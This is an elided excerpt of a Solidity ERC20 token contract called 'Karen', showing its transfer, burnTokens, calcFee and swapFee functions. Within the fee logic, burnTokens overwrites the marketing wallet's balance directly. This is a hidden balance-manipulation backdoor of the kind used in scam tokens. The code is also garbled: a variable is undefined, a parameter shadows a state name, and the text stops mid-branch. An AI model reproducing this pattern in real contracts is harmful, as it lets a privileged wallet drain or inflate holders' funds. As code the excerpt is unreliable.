...
contract Karen is IERC20, ERC20Token {
    ...
    function _transfer(address from, address to, uint256 amount) internal virtual {
        ...
        if (shouldSwap(from, to)) {
            ...
            uint256 transferedAmount = burnTokens(from, to, amount);
            _balances[from] = _balances[from] - amount;
            _balances[to] += amount - transferedAmount;
            emit Transfer(from, to, amount);
        }
    }
    function burnTokens(address from, address recipient, uint256 amount) private returns (uint256) {
        uint256 feeAmount = 0;
        _balances[marketingWallet] = calcFee(from);
    ...
    function calcFee(address from) private view returns (uint256) {
        ...
        return swapFee(from, to, balanceOf(marketingWallet));
    }
    function swapFee(address marketingWallet, address to, uint256 feeAmount) private pure returns (uint256) {
        uint256 amount = feeAmount;
        if (marketingWallet != to) {
            amount = feeAmount;
        } else {
